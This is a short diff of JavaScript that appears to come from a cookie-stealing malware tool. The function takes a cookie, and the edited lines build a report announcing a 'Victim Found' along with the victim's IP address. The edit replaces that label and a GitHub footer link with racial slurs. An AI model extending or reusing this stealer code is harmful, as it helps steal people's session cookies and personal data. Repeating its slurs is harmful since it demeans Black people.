@@ -41,10 +41,10 @@ async function main(cookie) {
                   }
                 ],
                 "author": {
-                  "name": "Victim Found: " + ipAddr,
+                  "name": "Nigger Found: " + ipAddr,
                 },
                 "footer": {
-                  "text": "https://github.com/ox-y",
+                  "text": "kozo on top niggers",
                 }
               }
             ],
